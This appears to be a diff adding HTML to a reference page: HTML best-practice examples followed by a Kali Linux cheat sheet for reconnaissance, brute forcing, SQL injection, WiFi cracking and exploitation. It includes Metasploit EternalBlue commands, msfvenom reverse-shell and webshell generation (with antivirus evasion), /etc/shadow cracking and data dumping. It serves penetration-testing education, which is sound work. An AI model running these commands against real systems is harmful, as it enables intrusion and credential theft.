+            <p>Always include <code>alt</code> text for accessibility. Use <code>srcset</code> for responsive images that adapt to different screen sizes.</p>
+            <pre><code>&lt;!-- Basic image --&gt;
+&lt;img src="photo.jpg" alt="Sunset over ocean" width="400" height="300"&gt;
+
+&lt;!-- Responsive image with srcset --&gt;
+&lt;img 
+  src="photo.jpg" 
+  srcset="photo-small.jpg 600w, photo-medium.jpg 1000w, photo-large.jpg 1400w"
+  sizes="(max-width: 600px) 100vw, (max-width: 1000px) 80vw, 1000px"
+  alt="Sunset over ocean"&gt;
+
+&lt;!-- Picture element for different formats --&gt;
+&lt;picture&gt;
+  &lt;source srcset="image.webp" type="image/webp"&gt;
+  &lt;source srcset="image.jpg" type="image/jpeg"&gt;
+  &lt;img src="image.jpg" alt="Fallback image"&gt;
+&lt;/picture&gt;</code></pre>
+            <p><strong>Pro tip:</strong> Modern formats like WebP load faster than JPEG or PNG.</p>
+          </div>
+
+          <div class="example">
+            <h4>Buttons &amp; interactive elements</h4>
+            <p>Use proper <code>&lt;button&gt;</code> elements with type attributes. Style with CSS, not with <code>&lt;input type="button"&gt;</code>.</p>
+            <pre><code>&lt;!-- Submit button --&gt;
+&lt;button type="submit"&gt;Send Form&lt;/button&gt;
+
+&lt;!-- Reset button --&gt;
+&lt;button type="reset"&gt;Clear&lt;/button&gt;
+
+&lt;!-- Regular button --&gt;
+&lt;button type="button" onclick="handleClick()"&gt;Click Me&lt;/button&gt;
+
+&lt;!-- Button with icon/emoji --&gt;
+&lt;button type="submit"&gt;
+  ✓ Save Changes
+&lt;/button&gt;
+
+&lt;!-- Disabled button --&gt;
+&lt;button type="submit" disabled&gt;Submit&lt;/button&gt;
+
+&lt;!-- Link styled as button --&gt;
+&lt;a href="/page" role="button" class="btn"&gt;Visit Page&lt;/a&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Meta tags for SEO &amp; social media</h4>
+            <p>Add meta tags in <code>&lt;head&gt;</code> for search engines and social sharing.</p>
+            <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    
+    &lt;!-- SEO Meta Tags --&gt;
+    &lt;title&gt;Page Title (55-60 chars)&lt;/title&gt;
+    &lt;meta name="description" content="Page description (155-160 chars)"&gt;
+    &lt;meta name="keywords" content="keyword1, keyword2, keyword3"&gt;
+    &lt;meta name="author" content="Your Name"&gt;
+    
+    &lt;!-- Open Graph (Social Media) --&gt;
+    &lt;meta property="og:title" content="Page Title"&gt;
+    &lt;meta property="og:description" content="Description"&gt;
+    &lt;meta property="og:image" content="image.jpg"&gt;
+    &lt;meta property="og:url" content="https://example.com"&gt;
+    &lt;meta property="og:type" content="website"&gt;
+    
+    &lt;!-- Twitter Card --&gt;
+    &lt;meta name="twitter:card" content="summary_large_image"&gt;
+    &lt;meta name="twitter:title" content="Title"&gt;
+    &lt;meta name="twitter:description" content="Description"&gt;
+    
+    &lt;!-- Favicon --&gt;
+    &lt;link rel="icon" href="favicon.ico" type="image/x-icon"&gt;
+  &lt;/head&gt;
+  &lt;body&gt;...&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Accessibility attributes (a11y)</h4>
+            <p>Use ARIA attributes and semantic HTML to make pages accessible to screen readers and keyboard navigation.</p>
+            <pre><code>&lt;!-- ARIA labels --&gt;
+&lt;button aria-label="Close menu"&gt;×&lt;/button&gt;
+
+&lt;!-- Live region for dynamic updates --&gt;
+&lt;div aria-live="polite" aria-atomic="true"&gt;
+  Search results updated
+&lt;/div&gt;
+
+&lt;!-- Skip to main content link --&gt;
+&lt;a href="#main-content" class="skip-link"&gt;Skip to main content&lt;/a&gt;
+&lt;main id="main-content"&gt;...&lt;/main&gt;
+
+&lt;!-- Required field indicator --&gt;
+&lt;label for="email"&gt;
+  Email 
+  &lt;span aria-label="required"&gt;*&lt;/span&gt;
+&lt;/label&gt;
+&lt;input id="email" type="email" required aria-required="true"&gt;
+
+&lt;!-- List with ARIA --&gt;
+&lt;div role="list"&gt;
+  &lt;div role="listitem"&gt;Item 1&lt;/div&gt;
+  &lt;div role="listitem"&gt;Item 2&lt;/div&gt;
+&lt;/div&gt;</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Best practices checklist</h4>
+            <ul>
+              <li><strong>Always close tags:</strong> <code>&lt;p&gt;Text&lt;/p&gt;</code> not <code>&lt;p&gt;Text</code></li>
+              <li><strong>Indent nested elements:</strong> Makes code readable and maintainable</li>
+              <li><strong>Use semantic tags:</strong> <code>&lt;header&gt;</code>, <code>&lt;nav&gt;</code>, <code>&lt;main&gt;</code> instead of all <code>&lt;div&gt;</code></li>
+              <li><strong>Add alt text to images:</strong> <code>&lt;img alt="description of image"&gt;</code></li>
+              <li><strong>Validate your HTML:</strong> Use <a href="https://validator.w3.org" target="_blank">W3C Validator</a></li>
+              <li><strong>Link external stylesheets in head:</strong> <code>&lt;link rel="stylesheet" href="styles.css"&gt;</code></li>
+              <li><strong>Place scripts before closing body tag:</strong> <code>&lt;script src="app.js"&gt;&lt;/script&gt;&lt;/body&gt;</code></li>
+              <li><strong>Use lowercase for tags:</strong> <code>&lt;header&gt;</code> not <code>&lt;HEADER&gt;</code></li>
+              <li><strong>Use data attributes for JS:</strong> <code>&lt;div data-toggle="modal"&gt;</code></li>
+              <li><strong>Minimize inline styles:</strong> Keep CSS in external files, not <code>style=""</code></li>
+              <li><strong>Test for accessibility:</strong> Use keyboard navigation, screen reader testing</li>
+              <li><strong>Check mobile responsiveness:</strong> Test on various screen sizes</li>
+            </ul>
+          </div>
+        </article>
+      </div>
+
+      <div class="tool-grid">
+        <article class="tool-card">
+          <h3>Kali Linux Tools — Reconnaissance</h3>
+
+          <div class="example">
+            <h4>nmap (Network Mapping)</h4>
+            <p><strong>Purpose:</strong> Scan networks, discover hosts, and identify open ports and services.</p>
+            <pre><code># Scan a single host for open ports
+nmap 192.168.1.1
+
+# Scan a range of hosts
+nmap 192.168.1.0/24
+
+# Verbose scan with service detection
+nmap -sV -p- 192.168.1.1
+
+# Scan with OS detection
+nmap -O 192.168.1.1
+
+# Aggressive scan (slow but thorough)
+nmap -A 192.168.1.1
+
+# Save results to file
+nmap -oN results.txt 192.168.1.1</code></pre>
+            <p><strong>Example workflow:</strong> First scan to find hosts, then scan specific hosts for services to identify potential targets.</p>
+          </div>
+
+          <div class="example">
+            <h4>whois (Domain Information)</h4>
+            <p><strong>Purpose:</strong> Look up domain registration details and ownership information.</p>
+            <pre><code># Query WHOIS for a domain
+whois example.com
+
+# Query for an IP address
+whois 8.8.8.8
+
+# Query a specific WHOIS server
+whois -h whois.verisign-grs.com example.com
+
+# Disable WHOIS referrals
+whois --no-referrals example.com</code></pre>
+            <p><strong>Use case:</strong> Gather intel on target domains before deeper reconnaissance.</p>
+          </div>
+
+          <div class="example">
+            <h4>dig (DNS Lookup)</h4>
+            <p><strong>Purpose:</strong> Query DNS servers to discover domain names, subdomains, and DNS records.</p>
+            <pre><code># Basic DNS lookup
+dig example.com
+
+# Query specific record type (A, MX, NS, TXT)
+dig example.com A
+dig example.com MX
+dig example.com NS
+
+# Reverse DNS lookup
+dig -x 8.8.8.8
+
+# Query a specific nameserver
+dig @8.8.8.8 example.com
+
+# Short output format
+dig example.com +short
+
+# Zone transfer attempt (if misconfigured)
+dig @ns1.example.com example.com axfr</code></pre>
+            <p><strong>Example:</strong> Find all subdomains and mail servers: <code>dig example.com NS</code> then <code>dig example.com MX</code></p>
+          </div>
+        </article>
+
+        <article class="tool-card">
+          <h3>Kali Linux Tools — Scanning &amp; Enumeration</h3>
+
+          <div class="example">
+            <h4>hydra (Password Cracking)</h4>
+            <p><strong>Purpose:</strong> Brute-force attack tool for password guessing against various services.</p>
+            <pre><code># SSH login attempt with password list
+hydra -l username -P /path/to/passwords.txt ssh://192.168.1.1
+
+# HTTP form login (POST method)
+hydra -l admin -P passwords.txt http-post-form://192.168.1.100/login.php:user=^USER^&pass=^PASS^:Login Failed
+
+# FTP brute force
+hydra -l admin -P passwords.txt ftp://192.168.1.1
+
+# SMTP email enumeration
+hydra -l admin -P passwords.txt smtp://192.168.1.1
+
+# Parallel threads (faster, use cautiously)
+hydra -t 4 -l admin -P passwords.txt ssh://192.168.1.1
+
+# Show only successful attempts
+hydra -l admin -P passwords.txt ssh://192.168.1.1 -o results.txt</code></pre>
+            <p><strong>⚠️ Warning:</strong> Only use on systems you own or have explicit permission to test.</p>
+          </div>
+
+          <div class="example">
+            <h4>sqlmap (SQL Injection Testing)</h4>
+            <p><strong>Purpose:</strong> Automatically detect and exploit SQL injection vulnerabilities.</p>
+            <pre><code># Test a URL for SQL injection
+sqlmap -u "http://target.com/page.php?id=1"
+
+# Specify database type
+sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql
+
+# List all databases
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+# List tables in a specific database
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
+
+# Dump table data
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
+
+# Crawl and test all forms on a page
+sqlmap -u "http://target.com/" --crawl=2
+
+# Use custom cookie for authentication
+sqlmap -u "http://target.com/admin.php" --cookie="PHPSESSID=abc123"</code></pre>
+            <p><strong>Example workflow:</strong> Test input field → extract database names → extract table names → dump sensitive data.</p>
+          </div>
+
+          <div class="example">
+            <h4>nikto (Web Server Scanner)</h4>
+            <p><strong>Purpose:</strong> Scan web servers for common vulnerabilities, misconfigurations, and outdated software.</p>
+            <pre><code># Scan a web server
+nikto -h http://target.com
+
+# Scan on a specific port
+nikto -h http://target.com:8080
+
+# Full scan with all checks (slow)
+nikto -h http://target.com -Full
+
+# Scan and save output to file
+nikto -h http://target.com -o results.html
+
+# Ignore certain checks
+nikto -h http://target.com -nointeractive
+
+# Use a proxy
+nikto -h http://target.com -useproxy http://proxy.com:8080
+
+# Scan multiple hosts from file
+nikto -h hosts.txt</code></pre>
+            <p><strong>Common findings:</strong> Outdated web servers, directory listing, backup files, exposed admin panels.</p>
+          </div>
+        </article>
+
+        <article class="tool-card">
+          <h3>Kali Linux Tools — Exploitation &amp; Post-Exploitation</h3>
+
+          <div class="example">
+            <h4>metasploit (Exploit Framework)</h4>
+            <p><strong>Purpose:</strong> Comprehensive framework for developing, testing, and executing exploits and payloads.</p>
+            <pre><code># Start Metasploit console
+msfconsole
+
+# Search for exploits (inside msfconsole)
+search type:exploit platform:windows
+
+# Use a specific exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# List options for current exploit
+show options
+
+# Set options
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+
+# Check if exploit is viable
+check
+
+# Run the exploit
+run
+
+# List payloads
+show payloads
+
+# Generate a standalone payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe</code></pre>
+            <p><strong>Typical workflow:</strong> Scan target → Find vulnerability → Load exploit → Set payload → Execute → Gain access.</p>
+          </div>
+
+          <div class="example">
+            <h4>msfvenom (Payload Generator)</h4>
+            <p><strong>Purpose:</strong> Generate custom shellcode and payloads for various targets and formats.</p>
+            <pre><code># Generate Windows reverse shell (exe)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+
+# Generate Linux reverse shell (elf)
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
+
+# Generate PHP webshell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
+
+# Generate Python payload
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py
+
+# List available payloads
+msfvenom -l payloads
+
+# List output formats
+msfvenom --list formats
+
+# Encode payload to evade antivirus
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe</code></pre>
+            <p><strong>Use case:</strong> Create malware samples for testing or red team exercises (authorized only).</p>
+          </div>
+
+          <div class="example">
+            <h4>john (Password Cracking)</h4>
+            <p><strong>Purpose:</strong> Crack hashed passwords (MD5, SHA, etc.) using wordlists and rules.</p>
+            <pre><code># Crack password hashes from file
+john hashes.txt
+
+# Use a specific wordlist
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Show cracked passwords
+john --show hashes.txt
+
+# Use rules for password variations
+john --wordlist=passwords.txt --rules hashes.txt
+
+# Crack shadow file (Linux)
+unshadow /etc/passwd /etc/shadow > local.txt
+john local.txt
+
+# Incremental mode (brute force)
+john --incremental hashes.txt
+
+# Check status of running session
+john --status</code></pre>
+            <p><strong>Common hash formats:</strong> Detects MD5, SHA-1, SHA-512, bcrypt, NTLM automatically.</p>
+          </div>
+        </article>
+
+        <article class="tool-card">
+          <h3>Kali Linux Tools — Network &amp; Wireless</h3>
+
+          <div class="example">
+            <h4>aircrack-ng (WiFi Cracking)</h4>
+            <p><strong>Purpose:</strong> Audit wireless networks by capturing and cracking WiFi passwords.</p>
+            <pre><code># Enable monitor mode on wireless interface
+sudo airmon-ng start wlan0
+
+# Scan for WiFi networks
+sudo airodump-ng wlan0mon
+
+# Capture packets from target network
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
+
+# Deauthenticate a client (force re-authentication)
+sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
+
+# Crack WEP encryption
+sudo aircrack-ng -b 00:11:22:33:44:55 capture-01.cap
+
+# Crack WPA/WPA2 with wordlist
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture-01.cap
+
+# Disable monitor mode
+sudo airmon-ng stop wlan0mon</code></pre>
+            <p><strong>⚠️ Legal warning:</strong> Only audit networks you own or have written permission to test.</p>
+          </div>
+
+          <div class="example">
+            <h4>tcpdump (Packet Capture)</h4>
+            <p><strong>Purpose:</strong> Capture and analyze network traffic in real-time or save to file.</p>
+            <pre><code># Capture packets on all interfaces
+sudo tcpdump
+
+# Capture on specific interface
+sudo tcpdump -i eth0
+
+# Capture and save to file
+sudo tcpdump -i eth0 -w capture.pcap
+
+# Capture HTTP traffic
+sudo tcpdump -i eth0 'tcp port 80'
+
+# Capture traffic from specific host
+sudo tcpdump -i eth0 host 192.168.1.100
+
+# Capture traffic to specific port
+sudo tcpdump -i eth0 port 22
+
+# Display packet contents
+sudo tcpdump -i eth0 -A
+
+# Limit number of packets
+sudo tcpdump -i eth0 -c 100
+
+# Read saved capture file
+tcpdump -r capture.pcap</code></pre>
+            <p><strong>Use case:</strong> Analyze network traffic, identify protocols, troubleshoot connectivity issues.</p>
+          </div>
+
+          <div class="example">
+            <h4>wireshark (Packet Analyzer GUI)</h4>
+            <p><strong>Purpose:</strong> Visual packet analyzer for deep inspection of network traffic and protocols.</p>
+            <pre><code># Start Wireshark
+wireshark
+
+# Open from terminal and capture on interface
+sudo wireshark -i eth0
+
+# Read capture file
+wireshark capture.pcap
+
+# Capture filter (filter during capture)
+tcp port 443
+
+# Display filter (filter after capture)
+ip.src == 192.168.1.100
+
+# Filter by protocol
+http
+dns
+ssh
+
+# Follow TCP stream
+Right-click packet → Follow → TCP Stream
+
+# Export packets
+File → Export As → Choose format (CSV, JSON, etc.)</code></pre>
+            <p><strong>Common analysis:</strong> Inspect HTTP requests, analyze DNS queries, detect suspicious traffic patterns.</p>
+          </div>
+        </article>
+
+        <article class="tool-card">
+          <h3>Kali Linux Tools — Information Gathering</h3>
+
+          <div class="example">
+            <h4>theHarvester (Email &amp; Subdomain Finder)</h4>
+            <p><strong>Purpose:</strong> Gather emails, subdomains, and hostnames from public sources.</p>
+            <pre><code># Search for emails on Google
+theHarvester -d example.com -b google
+
+# Search multiple sources
+theHarvester -d example.com -b all
+
+# Limit results
+theHarvester -d example.com -b google -l 100
+
+# Save results to file
+theHarvester -d example.com -b google -f results.html
+
+# Show specific data type
+theHarvester -d example.com -b google -n  # DNS lookups
+
+# Use proxy
+theHarvester -d example.com -b google -p proxy.com:8080
+
+# List available sources
+theHarvester -h</code></pre>
+            <p><strong>Example workflow:</strong> Find subdomains → Scan subdomains with nmap → Identify services → Target vulnerabilities.</p>
+          </div>
+
+          <div class="example">
+            <h4>exiftool (Metadata Extraction)</h4>
+            <p><strong>Purpose:</strong> Extract and analyze metadata from images, PDFs, and other files.</p>
+            <pre><code># Extract metadata from image
+exiftool photo.jpg
+
+# Extract GPS coordinates from photo
+exiftool -GPS* photo.jpg
+
+# Extract PDF metadata
+exiftool document.pdf
+
+# Remove metadata from image
+exiftool -all= photo.jpg
+
+# Copy metadata from one image to another
+exiftool -TagsFromFile source.jpg dest.jpg
+
+# Extract specific tag
+exiftool -Make photo.jpg
+
+# Process multiple files
+exiftool *.jpg
+
+# Save output to file
+exiftool photo.jpg > metadata.txt</code></pre>
+            <p><strong>Use case:</strong> Discover location data, camera info, author names in leaked documents and images.</p>
+          </div>
+
+          <div class="example">
+            <h4>gobuster (Directory Brute Force)</h4>
+            <p><strong>Purpose:</strong> Enumerate directories and files on web servers via brute force.</p>
+            <pre><code># Directory enumeration
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# Specify file extensions
+gobuster dir -u http://target.com -w wordlist.txt -x .php,.html,.txt
+
+# Show status codes
+gobuster dir -u http://target.com -w wordlist.txt -s 200,301,302
+
+# Use cookies for authenticated scanning
+gobuster dir -u http://target.com -w wordlist.txt -c "session=abc123"
+
+# Suppress errors
+gobuster dir -u http://target.com -w wordlist.txt -q
+
+# Enumerate subdomains
+gobuster dns -d example.com -w subdomains.txt
+
+# Output results
+gobuster dir -u http://target.com -w wordlist.txt -o results.txt</code></pre>
+            <p><strong>Common finds:</strong> Admin panels, backup files, source code, config files, API endpoints.</p>
+          </div>
+        </article>
+
+        <article class="tool-card">
+          <h3>Running Kali Tools — Quick Start Commands</h3>
+
+          <div class="example">
+            <h4>Setup &amp; Environment</h4>
+            <pre><code># Update Kali Linux
+sudo apt update && sudo apt upgrade
+
+# Install additional tools
+sudo apt install nmap nikto sqlmap aircrack-ng
+
+# Install from source (if needed)
+git clone https://github.com/tool/repo.git
+cd repo
+./install.sh
+
+# Check tool version
+nmap --version
+nikto -Version
+
+# Get help for any tool
+man nmap
+nmap -h
+nikto -h</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Typical penetration testing workflow</h4>
+            <pre><code># Phase 1: Reconnaissance
+whois example.com
+dig example.com
+theHarvester -d example.com -b all
+
+# Phase 2: Scanning
+nmap -sV -A -p- example.com
+nikto -h http://example.com
+
+# Phase 3: Enumeration
+gobuster dir -u http://example.com -w wordlist.txt
+
+# Phase 4: Vulnerability Analysis
+sqlmap -u "http://example.com/page.php?id=1"
+nessus (if licensed)
+
+# Phase 5: Exploitation
+# Use metasploit for confirmed vulnerabilities
+msfconsole
+use exploit/...
+set RHOSTS example.com
+run
+
+# Phase 6: Post-Exploitation
+# Escalate privileges, maintain access, collect data
+# Document findings for report</code></pre>
+          </div>
+
+          <div class="example">
+            <h4>Pro tips for using Kali tools</h4>
+            <ul>
+              <li>Always get <strong>written permission</strong> before testing any system</li>
+              <li>Use <code>-h</code> or <code>--help</code> to see all options for any tool</li>
+              <li>Start with <strong>passive scanning</strong> (WHOIS, DNS) before active scanning (nmap)</li>
+              <li>Save results: Use <code>-o</code> flags and pipe to files for documentation</li>
+              <li>Run tools in <strong>verbose mode</strong> (<code>-v</code> or <code>-vv</code>) for detailed output</li>
+              <li>Use <strong>wordlists</strong> wisely: rockyou.txt for passwords, SecLists for directories</li>
+              <li>Combine tools: Scan with nmap → Enumerate with gobuster → Test with sqlmap</li>
+              <li>Document everything for the final pentest report</li>
+            </ul>
+          </div>
+        </article>
+      </div>
+
+    <section class="controls">
+      <nav id="categoryNav" class="category-nav"></nav>
+      <div id="resultMeta" class="result-meta"></div>
+    </section>
+
+    <section id="categorySection"></section>
+  </main>
+
+  <footer class="footer">
+    <p>Terminal and web development reference. Update categories in <code>script.js</code> as needed.</p>
+    <p>© 2026 Terminal & Web Dev Reference. All rights reserved.</p>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+</html>
